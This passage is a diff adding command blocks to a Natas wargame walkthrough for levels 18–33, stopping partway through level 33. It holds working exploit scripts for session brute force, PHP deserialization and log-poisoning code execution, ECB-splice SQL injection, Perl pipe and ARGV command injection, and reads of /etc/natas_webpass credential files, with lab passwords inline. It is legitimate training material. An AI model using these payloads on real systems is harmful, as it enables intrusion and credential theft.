 1. **Read the source.** `index-source.html` shows `$maxid = 640`, `session_id(createID(...))` with `createID` returning `rand(1,$maxid)`, and `print_credentials()` gated on `$_SESSION["admin"] == 1`.
 2. **Brute-force the cookie.**
@@ -706,6 +829,26 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** Same session scheme as level 18, but "session IDs are no longer sequential". The source reveals the format: `$idstr = "$idnum-$user"; return bin2hex($idstr);` with `$idnum = rand(1, $maxid)` and `$maxid = 640`.
 - **Technique and why it works:** the session ID is the **hex encoding** of `"<number>-<username>"`. So the admin session's ID is `bin2hex("<n>-admin")` for some `n` in 1..640. We brute-force that predictable structure: for each `n`, send `PHPSESSID=<hex(n + "-admin")>`. When we hit the admin session, the server loads it and prints the credentials. The weakness is again a tiny, deterministic session-ID space — hex-encoding does not add entropy.
 
+- **Commands:**
+  ```
+  curl -s -u natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT http://natas19.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | grep -o "idstr = [^;]*" | head -2
+  python3 - <<'PY'
+  import urllib.request, base64
+  url = "http://natas19.natas.labs.overthewire.org/"
+  auth = "Basic " + base64.b64encode(b"natas19:qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT").decode()
+  for n in range(1, 641):
+      sid = (str(n) + "-admin").encode().hex()
+      req = urllib.request.Request(url, headers={"Authorization": auth, "Cookie": "PHPSESSID=" + sid})
+      body = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "replace")
+      if "You are an admin" in body:
+          i = body.find("<pre>"); j = body.find("</pre>", i)
+          print("FOUND n", n, "sid", sid)
+          print(body[i:j+6])
+          break
+  else:
+      print("none")
+  PY
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `createID` shows `$idstr = "$idnum-$user"; return bin2hex($idstr);` and `$maxid = 640`.
 2. **Brute-force the encoded ID.**
@@ -730,6 +873,23 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** The level uses a custom session save handler. `mywrite` serialises `$_SESSION` as one `key value` per line (`"$key $value\n"`), and `myread` rebuilds `$_SESSION` by splitting each line on the first space. Credentials are printed when `$_SESSION["admin"] == 1`.
 - **Technique and why it works:** **session-file injection**. The `name` parameter is stored into `$_SESSION["name"]`, and the write handler appends it verbatim as a line. If we send a name containing a newline followed by `admin 1`, the session file ends up with a separate line `admin 1`. On the *next* request the read handler parses that line as `$_SESSION["admin"] = 1`, so we are treated as admin. The handler does not escape newlines, so the "value" of one key becomes new keys.
 
+- **Commands:**
+  ```
+  curl -s -u natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao http://natas20.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "function myread[^}]*}\|function mywrite[^}]*}" | head -c 700
+  python3 - <<'PY'
+  import urllib.request, urllib.parse, base64, http.cookiejar
+  auth = "Basic " + base64.b64encode(b"natas20:slOKYGsjlJhaqKliGvrgWAzln0JyrWao").decode()
+  url = "http://natas20.natas.labs.overthewire.org/"
+  cj = http.cookiejar.CookieJar()
+  op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
+  data = urllib.parse.urlencode({"name": "x\nadmin 1"}).encode()
+  op.open(urllib.request.Request(url, data=data, headers={"Authorization": auth}), timeout=10).read()
+  body = op.open(urllib.request.Request(url, headers={"Authorization": auth}), timeout=10).read().decode("utf-8", "replace")
+  i = body.find("<pre>"); j = body.find("</pre>", i)
+  print("You are an admin:", "You are an admin" in body)
+  print(body[i:j+6] if i >= 0 else body[:200])
+  PY
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `mywrite` builds `"$key $value\n"` lines; `myread` does `explode(" ", $line, 2)` and assigns `$_SESSION[$parts[0]] = $parts[1]`.
 2. **Inject a newline.** Send `name = "x\nadmin 1"`. The write handler stores two lines: `name x` and `admin 1`.
@@ -749,6 +909,27 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** The main page starts a session and prints credentials when `$_SESSION["admin"] == 1`. It is colocated with `natas21-experimenter.natas.labs.overthewire.org`, which shares the same session store.
 - **Technique and why it works:** **shared-session privilege injection**. The experimenter page copies every request parameter into the session: `foreach($_REQUEST as $key => $val) { $_SESSION[$key] = $val; }`. Because both hosts use the same PHP session storage, we POST `admin=1` to the experimenter, which writes `admin=1` into the shared session. Then we load the main page with the *same* `PHPSESSID` and it reads `admin=1` from the shared session.
 
+- **Commands:**
+  ```
+  curl -s -u natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU http://natas21-experimenter.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "foreach(\$_REQUEST[^}]*}"
+  python3 - <<'PY'
+  import urllib.request, urllib.parse, base64
+  auth = "Basic " + base64.b64encode(b"natas21:7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU").decode()
+  exp = "http://natas21-experimenter.natas.labs.overthewire.org/"
+  main = "http://natas21.natas.labs.overthewire.org/"
+  data = urllib.parse.urlencode({"submit": "1", "admin": "1", "bgcolor": "#fff", "align": "left", "fontsize": "100%"}).encode()
+  r = urllib.request.urlopen(urllib.request.Request(exp, data=data, headers={"Authorization": auth}), timeout=10)
+  sid = None
+  for c in (r.headers.get_all("Set-Cookie") or []):
+      if "PHPSESSID=" in c:
+          sid = c.split("PHPSESSID=")[1].split(";")[0]
+  print("session id:", sid)
+  body = urllib.request.urlopen(urllib.request.Request(main, headers={"Authorization": auth, "Cookie": "PHPSESSID=" + sid}), timeout=10).read().decode("utf-8", "replace")
+  i = body.find("<pre>"); j = body.find("</pre>", i)
+  print("admin:", "You are an admin" in body)
+  print(body[i:j+6] if i >= 0 else "")
+  PY
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read both sources.** The main page checks `$_SESSION["admin"]`; the experimenter sets `$_SESSION[$key] = $val` for every request key on `submit`.
 2. **Inject via the experimenter.** POST `submit=1&admin=1&...` to the experimenter; it returns `Set-Cookie: PHPSESSID=<sid>`.
@@ -768,6 +949,11 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** The source shows `if(array_key_exists("revelio", $_GET))` prints the credentials. There is no authentication check around it.
 - **Technique and why it works:** the credentials are gated only on the *presence* of a GET parameter named `revelio`. There is no login check and no admin session test — a client-supplied parameter alone unlocks the output. Adding `?revelio` to the URL is enough.
 
+- **Commands:**
+  ```
+  curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF http://natas22.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "if(array_key_exists(\"revelio\"[^}]*}"
+  curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF "http://natas22.natas.labs.overthewire.org/?revelio" | sed "s/<[^>]*>//g" | grep -aE "admin|Username|Password"
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `index-source.html` shows the `revelio` check with no auth around it.
 2. **Send the parameter.**
@@ -786,6 +972,14 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** The page accepts a password in `?passwd=` and prints the credentials when `strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10)`.
 - **Technique and why it works:** **PHP loose comparison / numeric-prefix parsing**. Two conditions must hold at once: the string must *contain* `iloveyou` (a substring test), and the same string must compare *greater than 10* as a number. When PHP compares a string with an integer in this style, it converts the string to a number by reading its leading numeric prefix and ignoring the rest. So `"10111iloveyou"` becomes `10111` — greater than 10 — while still containing `iloveyou`. The inverse order `"iloveyou10111"` has no leading digits, converts to `0`, and fails the numeric test. The level is a lesson in type juggling: one value can satisfy a string test and a numeric test at the same time if it is crafted so each check looks at a different part of it.
 
+- **Commands:**
+  ```
+  curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 http://natas23.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "if(strstr[^}]*}"
+  for p in 'iloveyou' '10111iloveyou' 'iloveyou10111'; do
+    echo "passwd=$p"
+    curl -s -u natas23:CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5 "http://natas23.natas.labs.overthewire.org/?passwd=$p" | sed "s/<[^>]*>//g" | grep -aE "credentials|Wrong|Password"
+  done
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `index-source.html` shows the two-part check. `strstr` needs the literal substring; the `>` comparison is a loose numeric comparison.
 2. **Reason about the conversion.** PHP takes the leading digits as the numeric value, so put the number *first* and the magic word after it.
@@ -809,6 +1003,14 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** The page prints the credentials when `!strcmp($_REQUEST["passwd"],"<censored>")` is true — the classic "correct password" idiom.
 - **Technique and why it works:** **type confusion into `strcmp`**. `strcmp` expects two strings. PHP's `$_REQUEST` can deliver an *array* when the parameter is written `passwd[]=x`. Calling `strcmp` with an array raises a warning ("expects parameter 1 to be string, array given") and returns `NULL` instead of an integer. `!NULL` is `true`, so the condition passes — the password is never compared at all. Crucially PHP does not abort on that warning, so execution continues into the success branch. The level teaches that type checks must be explicit: `is_string()` before `strcmp`, or a strict comparison against a known hash.
 
+- **Commands:**
+  ```
+  curl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX http://natas24.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "if(!strcmp[^}]*}"
+  echo "passwd=x (a string):"
+  curl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX "http://natas24.natas.labs.overthewire.org/?passwd=x" | sed "s/<[^>]*>//g" | grep -aE "credentials|Wrong|Password"
+  echo "passwd[]=x (an array):"
+  curl -s -u natas24:shlL4BvOtawNCd81dwdKRHFzmTEjYYQX "http://natas24.natas.labs.overthewire.org/?passwd[]=x" | sed "s/<[^>]*>//g" | grep -aE "credentials|Wrong|Password|Warning"
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `index-source.html` shows `if(!strcmp($_REQUEST["passwd"],"<censored>"))`.
 2. **Try the normal case.** `?passwd=x` → `Wrong!` (a real string comparison, non-zero result).
@@ -833,6 +1035,15 @@ Verification rule used throughout: a password is accepted only if a request to
 
   We trigger the log write with a deliberate traversal (`lang=../x`), which calls `logRequest()`, and put PHP code in the `User-Agent`. Then we include our own log file: `lang=....//logs/natas25_<sid>.log`. PHP executes the code inside the log.
 
+- **Commands:**
+  ```
+  curl -s -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo http://natas25.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | grep -o "function safeinclude.*return 0;"
+  curl -s -c /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo http://natas25.natas.labs.overthewire.org/ -o /dev/null
+  SID=$(awk '/PHPSESSID/{print $7}' /tmp/n25.jar); echo "PHPSESSID=$SID"
+  curl -s -b /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo -A '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>' --get --data-urlencode 'lang=../x' http://natas25.natas.labs.overthewire.org/ -o /dev/null
+  echo "traversal request sent; the User-Agent line is now in logs/natas25_$SID.log"
+  curl -s -b /tmp/n25.jar -u natas25:UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo --get --data-urlencode "lang=....//logs/natas25_$SID.log" http://natas25.natas.labs.overthewire.org/ | grep -o "[A-Za-z0-9]\{32\}" | tail -1
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `safeinclude()` shows the `str_replace("../","",...)` strip and the `natas_webpass` block; `logRequest()` shows the exact log path and that the UA is written verbatim.
 2. **Start a session and note the id.**
@@ -864,6 +1075,37 @@ Verification rule used throughout: a password is accepted only if a request to
 
   The private property names must be serialized with their mangled names: `\x00Logger\x00logFile`, `\x00Logger\x00initMsg`, `\x00Logger\x00exitMsg` (NUL, class name, NUL, property). The `s:N:` length prefixes must be exact, including those NUL bytes.
 
+- **Commands:**
+  ```
+  curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | sed "s/    /\n/g" | grep -E "class Logger|private \$|function __|logFile|unserialize"
+  curl -s -c /tmp/n26.jar -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT http://natas26.natas.labs.overthewire.org/ -o /dev/null
+  SID=$(awk '/PHPSESSID/{print $7}' /tmp/n26.jar); echo "PHPSESSID=$SID"
+  python3 - <<'PY'
+  import base64
+  sid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]
+  php = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>"
+  path = "img/natas26_%s.php" % sid
+  payload = ('O:6:"Logger":3:{'
+             's:15:"\x00Logger\x00logFile";s:%d:"%s";'
+             's:15:"\x00Logger\x00initMsg";s:0:"";'
+             's:15:"\x00Logger\x00exitMsg";s:%d:"%s";}' % (len(path), path, len(php), php))
+  print(base64.b64encode(payload.encode()).decode())
+  PY
+  B=$(python3 - <<'PY'
+  import base64
+  sid = open('/tmp/n26.jar').read().split('PHPSESSID')[1].split()[0]
+  php = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>"
+  path = "img/natas26_%s.php" % sid
+  payload = ('O:6:"Logger":3:{'
+             's:15:"\x00Logger\x00logFile";s:%d:"%s";'
+             's:15:"\x00Logger\x00initMsg";s:0:"";'
+             's:15:"\x00Logger\x00exitMsg";s:%d:"%s";}' % (len(path), path, len(php), php))
+  print(base64.b64encode(payload.encode()).decode())
+  PY
+  )
+  curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT -H "Cookie: PHPSESSID=$SID; drawing=$B" --get --data-urlencode "x1=1" --data-urlencode "y1=1" --data-urlencode "x2=2" --data-urlencode "y2=2" http://natas26.natas.labs.overthewire.org/ -o /dev/null
+  curl -s -u natas26:3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT "http://natas26.natas.labs.overthewire.org/img/natas26_$SID.php"
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `Logger` has `__construct` (writes `initMsg`), `log()`, and `__destruct` (writes `exitMsg`); `drawFromUserdata()` unserializes the cookie; the image path is `img/natas26_<session_id>.png`.
 2. **Start a session** so the image path (and therefore our chosen `logFile` name) is predictable:
@@ -908,6 +1150,25 @@ Verification rule used throughout: a password is accepted only if a request to
 
   So the padded username authenticates against the row we created, but the data dump uses the trimmed name and returns the genuine natas28 password.
 
+- **Commands:**
+  ```
+  curl -s -u natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV http://natas27.natas.labs.overthewire.org/index-source.html | sed "s/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g" | tr -d "\n" | sed "s/    /\n/g" | grep -E "CREATE TABLE|varchar|substr|trim|INSERT|SELECT"
+  python3 - <<'PY'
+  import urllib.request, urllib.parse, base64, re
+  auth = "Basic " + base64.b64encode(b"natas27:mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV").decode()
+  H = "http://natas27.natas.labs.overthewire.org/"
+  def post(usr, pw):
+      d = urllib.parse.urlencode({"username": usr, "password": pw}).encode()
+      b = urllib.request.urlopen(urllib.request.Request(H, data=d, headers={"Authorization": auth}), timeout=10).read().decode("utf-8","replace")
+      return b[b.find('<div id="content">'):]
+  reg = "natas28" + " " * 57 + "x"
+  login = "natas28" + " " * 57
+  print("register username='natas28'+57sp+'x' (65 chars), password=''")
+  print("  ", re.sub('<[^>]+>',' ',post(reg, ""))[:200].strip())
+  print("login    username='natas28'+57sp (64 chars), password=''")
+  print("  ", re.sub('<[^>]+>',' ',post(login, ""))[:400].strip())
+  PY
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** Note the three different treatments of the username: `trim()` in the guard, `substr(...,0,64)` in the INSERT, `trim()` again in `dumpData()`.
 2. **Register the padded account.** `"natas28" + 57 spaces + "x"` = 65 chars, password empty:
@@ -933,6 +1194,66 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** A joke search. `POST query=...` returns `302` to `search.php/?query=<base64 ciphertext>`; the search page decrypts it and runs a SQL query. No source is available ("out of sauce"), so this is a black-box level.
 - **Technique and why it works:** **ECB cut-and-paste against the encrypted query**. The ciphertext is the raw AES-ECB encryption of a plaintext of the form `<10-byte prefix><our query><padding>`, base64-encoded. ECB encrypts each 16-byte block independently, so equal plaintext blocks produce equal ciphertext blocks — visible immediately: `A*64` yields three identical blocks. That lets us splice blocks from different ciphertexts. We choose a query that places our SQL exactly at the start of a block, and we keep the original prefix blocks from a benign query. The resulting ciphertext decrypts to `<prefix><our SQL>`, and the server runs it inside `... WHERE joke LIKE '<input>%'`, so our payload closes the quote and uses `-- ` to comment out the rest.
 
+- **Commands:**
+  ```
+  python3 - <<'PY'
+  import urllib.request, urllib.parse, base64, urllib.error
+  auth = "Basic " + base64.b64encode(b"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3").decode()
+  class NR(urllib.request.HTTPRedirectHandler):
+      def redirect_request(self, req, fp, code, msg, headers, newurl): return None
+  op = urllib.request.build_opener(NR)
+  def ct_for(q):
+      d = urllib.parse.urlencode({"query": q}).encode()
+      try:
+          r = op.open(urllib.request.Request("http://natas28.natas.labs.overthewire.org/index.php", data=d, headers={"Authorization": auth}), timeout=10)
+          loc = r.headers.get("Location")
+      except urllib.error.HTTPError as e:
+          loc = e.headers.get("Location")
+      return base64.b64decode(urllib.parse.unquote(loc.split("query=")[1]))
+  print("ciphertext length vs query length (16-byte blocks => ECB):")
+  for n in range(0, 17):
+      raw = ct_for("a" * n)
+      print("   a*%-2d -> %3d bytes (%d blocks)" % (n, len(raw), len(raw) // 16))
+  raw = ct_for("A" * 64)
+  print("identical plaintext blocks encrypt identically (ECB fingerprint):")
+  print("   A*64 ->", [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])
+  print("where our input starts: 'a'*8 and 'a'*12 share block 2, 13 changes it")
+  for n in (8, 12, 13):
+      raw = ct_for("a" * n)
+      print("   a*%-2d ->" % n, [raw[i:i+16].hex()[:12] for i in range(0, len(raw), 16)])
+  PY
+  python3 - <<'PY'
+  import urllib.request, urllib.parse, base64, urllib.error
+  auth = "Basic " + base64.b64encode(b"natas28:Hy5wZLfVml7jnGmuvfbilRTUUkk29Dv3").decode()
+  class NR(urllib.request.HTTPRedirectHandler):
+      def redirect_request(self, req, fp, code, msg, headers, newurl): return None
+  op = urllib.request.build_opener(NR)
+  def ct_for(q):
+      d = urllib.parse.urlencode({"query": q}).encode()
+      try:
+          r = op.open(urllib.request.Request("http://natas28.natas.labs.overthewire.org/index.php", data=d, headers={"Authorization": auth}), timeout=10)
+          loc = r.headers.get("Location")
+      except urllib.error.HTTPError as e:
+          loc = e.headers.get("Location")
+      return base64.b64decode(urllib.parse.unquote(loc.split("query=")[1]))
+  def get_ct(raw):
+      u = "http://natas28.natas.labs.overthewire.org/search.php/?query=" + urllib.parse.quote(base64.b64encode(raw).decode())
+      return op.open(urllib.request.Request(u, headers={"Authorization": auth}), timeout=10).read().decode("utf-8","replace")
+  base = ct_for("a" * 8)
+  b = [base[i:i+16] for i in range(0, len(base), 16)]
+  print("base blocks:", [x.hex()[:12] for x in b])
+  for payload in [" UNION SELECT 1-- ", " UNION SELECT password FROM users-- "]:
+      q2 = "b" * 10 + payload
+      r2 = ct_for(q2)
+      b2 = [r2[i:i+16] for i in range(0, len(r2), 16)]
+      print("payload:", repr(payload))
+      print("payload blocks:", [x.hex()[:12] for x in b2])
+      spliced = b[0] + b[1] + b[2] + b"".join(b2[3:])
+      body = get_ct(spliced)
+      i = body.find("<ul>"); j = body.find("</ul>", i)
+      print("result:", body[i+4:j].strip()[:200])
+  PY
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Probe the ciphertext length.** Posting `a`*0..16 shows lengths 80 and 96 bytes: 16-byte blocks, and our input starts inside the first few blocks (boundary at 13 input bytes: 10-byte prefix + 6 = 16).
 2. **Confirm ECB.** `A*64` produces three identical ciphertext blocks (`f633e6b05f86` repeated) — deterministic, per-block encryption.
@@ -963,6 +1284,14 @@ Verification rule used throughout: a password is accepted only if a request to
 
   Recovering the source this way is itself an application of the bug: `file=|cat /var/www/n?tas/n?tas29/index.pl;`.
 
+- **Commands:**
+  ```
+  curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah http://natas29.natas.labs.overthewire.org/ | grep -o "href=[^>]*"
+  curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /var/www/n?tas/n?tas29/index.pl;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a "param('file')\|open(FD\|=~/natas\|escapeHTML"
+  curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|id;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a '^uid='
+  curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|ls;' http://natas29.natas.labs.overthewire.org/index.pl | grep -av '^<\|^$\|^  \|^<!'
+  curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /etc/n?tas_webpass/n?tas30;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a '^[A-Za-z0-9]\{32\}$'
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Recover the source.** `?file=|cat /var/www/n?tas/n?tas29/index.pl;` prints the Perl program (pipe execution + glob).
 2. **Read the flaw.** `open(FD, "$f.txt")` (two-arg open), and `$f=~/natas/` as the only filter.
@@ -978,6 +1307,14 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** A Perl login form. The query is built with `$dbh->quote(param('username'))` and `$dbh->quote(param('password'))`.
 - **Technique and why it works:** **DBI `quote()` type-argument injection through CGI list context**. `quote()` escapes quotes correctly, so a normal string cannot break out. But `DBI->quote($value, $data_type)` takes a *second* argument: the SQL type of the value. And CGI's `param('password')` returns a **list** when the parameter is sent more than once — so the two values we send become the two arguments of `quote()`. The second one is interpreted as the data type; `4` is `SQL_INTEGER`, which tells DBI the value is a number. DBI then does not quote the string at all, and our first value `1 OR 1=1` is spliced into the SQL raw. The query becomes `... and password =1 OR 1=1`, which is true for any row, so the first user row is returned (and printed).
 
+- **Commands:**
+  ```
+  curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF http://natas30.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g; s/&#39;/'/g" | grep -aE "query=|quote\(param|prepare|execute" | head -6
+  echo "repeated password (quote type argument = SQL_INTEGER):"
+  curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' -d 'password=4' http://natas30.natas.labs.overthewire.org/index.pl | sed "s/<[^>]*>//g" | grep -aE "win|fail"
+  echo "single password (a string, escaped):"
+  curl -s -u natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF -d 'username=natas31' -d 'password=1 OR 1=1' http://natas30.natas.labs.overthewire.org/index.pl | sed "s/<[^>]*>//g" | grep -aE "win|fail"
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `index-source.html` shows the `quote(param(...))` construction — no interpolation, but also no check that `param` returned a scalar.
 2. **Try the obvious injection.** A single `password=' OR 1=1 -- ` is escaped and fails (`fail :(`).
@@ -999,6 +1336,14 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** CSV-to-HTML uploader: `if ($cgi->upload('file')) { my $file = $cgi->param('file'); while (<$file>) {...} }`. The "file" is opened by Perl's two-argument `open` on the *string* returned by `param`.
 - **Technique and why it works:** **CGI `param`/`@ARGV` injection**. `$cgi->param('file')` is not guaranteed to be an uploaded filehandle: a multipart body may contain a plain text field named `file`, and `param` returns the *first* value in the body order. If we send `file=ARGV` as a plain field before the actual upload, `param('file')` returns the string `ARGV`, and Perl's two-argument `open("ARGV")` opens the magic filehandle `ARGV`, which reads `@ARGV`. `CGI.pm` fills `@ARGV` from the query string for keyword-style requests, so the path we put in the query string becomes the file that `while (<$file>)` reads line by line — and the lines are printed into the table. This is the classic "ARGV injection" bug class.
 
+- **Commands:**
+  ```
+  curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z http://natas31.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g; s/&#39;/'/g" | grep -aE "upload|param|while|split" | head -5
+  printf 'a,b\nc,d\n' > /tmp/t.csv
+  cat /tmp/t.csv
+  curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F "file=ARGV" -F "file=@/tmp/t.csv" "http://natas31.natas.labs.overthewire.org/index.pl?/etc/hostname" | sed -n "/<table/,/<\/table>/p"
+  curl -s -u natas31:aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z -F "file=ARGV" -F "file=@/tmp/t.csv" "http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32" | sed -n "/<table/,/<\/table>/p"
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `$cgi->upload('file')` only checks that *some* file field was sent; the handle used is `param('file')`, which can be any value.
 2. **Send a plain field first.**
@@ -1024,6 +1369,15 @@ Verification rule used throughout: a password is accepted only if a request to
 - **Goal:** Same CSV2HTML code as natas31, but the page says "This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute."
 - **Technique and why it works:** **ARGV injection, with the CGI quoting wrinkle defused**. The plain `file=ARGV` field again makes `param('file')` the string `ARGV`, so Perl's two-argument `open` reads `@ARGV`, populated by CGI from the query string. The difference from natas31 is that CGI.pm passes each query word through shell-style quoting when it builds `@ARGV`, so a bare `cmd|` reaches Perl as `cmd|\` (a filename ending in a backslash) and does not open a pipe. Ending the query with ` #` fixes this: the `#` comments out the quote/backslash CGI appended, and the `|` stays a pipe operator. That is why the query must be `?/bin/ls #|`.
 
+- **Commands:**
+  ```
+  curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY http://natas32.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g; s/&#39;/'/g" | grep -aE "upload\(|param\(|while|split|code exec" | head -6
+  printf 'a,b\nc,d\n' > /tmp/t.csv
+  cat /tmp/t.csv
+  curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F "file=ARGV" -F "file=@/tmp/t.csv" "http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20%23%7C" | sed -n "/<table/,/<\/table>/p"
+  curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F "file=ARGV" -F "file=@/tmp/t.csv" "http://natas32.natas.labs.overthewire.org/index.pl?/bin/ls%20-la%20/var/www/natas/natas32/getpassword%20%23%7C" | sed -n "/<table/,/<\/table>/p"
+  curl -s -u natas32:Rc3837d6qd3KoW0R2IgKssMXRX06btgY -F "file=ARGV" -F "file=@/tmp/t.csv" "http://natas32.natas.labs.overthewire.org/index.pl?/var/www/natas/natas32/getpassword%20%23%7C" | sed -n "/<table/,/<\/table>/p"
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** Identical `upload`/`param('file')`/`while (<$file>)` structure; the goal is code execution to run the webroot binary.
 2. **Get the quoting right.** `?/bin/ls #|` works, while `?/bin/ls|` does not (CGI turns it into a filename). The recording shows the working form and the directory listing: `getpassword`, `index.pl`, `tmp`, ...
@@ -1043,6 +1397,40 @@ Verification rule used throughout: a password is accepted only if a request to
   1. The phar must be a *valid* phar: stub `<?php __HALT_COMPILER(); ?>\r\n`, a manifest with API 1.1 and global flag `0x10000`, the metadata, one file entry, then a SHA1 of everything before the digest plus the `GBMB` trailer. The recording builds it with a small Python writer (`/tmp/pharbuild.py`) instead of `Phar` (whose `phar.readonly` ini is on by default on the lab).
   2. Private property names in the serialized string must be mangled as `\x00Executor\x00filename` etc., with exact `s:N:` lengths — a wrong length silently drops the property.
 
+- **Commands:**
+  ```
+  curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL http://natas33.natas.labs.overthewire.org/index-source.html | sed "s/<[^>]*>//g; s/&nbsp;/ /g; s/&lt;/</g; s/&gt;/>/g; s/&quot;/\"/g" | tr -d "\n" | sed "s/    /\n/g" | grep -aE "class Executor|private \$|md5_file|passthru|move_uploaded_file" | head -8
+  printf '<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>' > /tmp/n33payload.php
+  md5sum /tmp/n33payload.php
